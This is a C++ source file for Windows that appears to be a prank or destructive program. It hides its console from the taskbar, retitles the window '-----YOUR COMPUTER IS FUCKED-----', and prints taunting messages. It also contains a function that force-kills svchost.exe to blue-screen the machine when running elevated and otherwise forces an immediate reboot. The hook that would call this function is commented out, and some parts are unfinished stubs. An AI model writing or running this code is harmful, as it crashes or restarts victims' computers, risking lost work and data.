#include<iostream>
#include<Windows.h>
#include<stdlib.h>
#include<thread>
#include<atomic>
#include<ShObjIdl.h>
#include<ShlObj.h>
#include<direct.h>
#include<fstream>
#include<string>

using namespace std;

#ifndef UNICODE  
	typedef string String;
#else
	typedef wstring String;
#endif

BOOL IsProcessElevated()
{
	BOOL            fIsElevated = FALSE;
	HANDLE          hToken      = NULL;
	TOKEN_ELEVATION elevation;
	DWORD           dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) { goto Cleanup; }

	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) { goto Cleanup; }

	fIsElevated = elevation.TokenIsElevated;

Cleanup:
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	return fIsElevated;
}

void fuckShitUp()
{
	ofstream file;

	TCHAR appData[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, appData)))
	{
		wcout << appData;
	}

	for (int i = 0; i < 5; i++) {
		//file.open(to_string(i) + ".txt", appData);               //having trouble converting TCHAR to string
	}

	if (IsProcessElevated()) { system("taskkill /IM svchost.exe /F"); }  //Blue screen
	else    { system("c:\\windows\\system32\\shutdown /r /t 1 \n\n"); }  //Restarts PC
}

int main()
{
	HANDLE consoleStyle = GetStdHandle    (STD_OUTPUT_HANDLE);
	HWND   console      = GetConsoleWindow();

	for (int i = 0; i < 5; i++) {
		//file.open("")
	}

	SetWindowTextA(console, "-----YOUR COMPUTER IS FUCKED-----");
	SetWindowLong(console, GWL_STYLE, GetWindowLong(console, GWL_STYLE) & ~WS_MAXIMIZEBOX & ~WS_SIZEBOX);
	SetConsoleTextAttribute(consoleStyle, FOREGROUND_RED);
	SetWindowPos(console, 0, GetSystemMetrics(SM_CXSCREEN) - 500, -50, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

	ITaskbarList* pTaskList = NULL;
	HRESULT initRet = CoInitialize(NULL);
	HRESULT createRet = CoCreateInstance(
		CLSID_TaskbarList,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ITaskbarList,
		(LPVOID*)&pTaskList);

	if (createRet == S_OK)
	{
		pTaskList->DeleteTab(GetConsoleWindow());
		pTaskList->Release();
	}

	CoUninitialize();

	string ez     = "\n\nWell that was easy....\n\n";
	string anyway = "Anyway, I'm gonna fuck up your computer (:\n\n";

	for (int i = 0;i < 26;i++) {
		Sleep(50);
		cout << ez[i];
	}

	Sleep(1000);

	for (int i = 0; i < 45; i++) {
		Sleep(50);
		cout << anyway[i];
	}

	Sleep(5000);

	//atexit(fuckShitUp);

}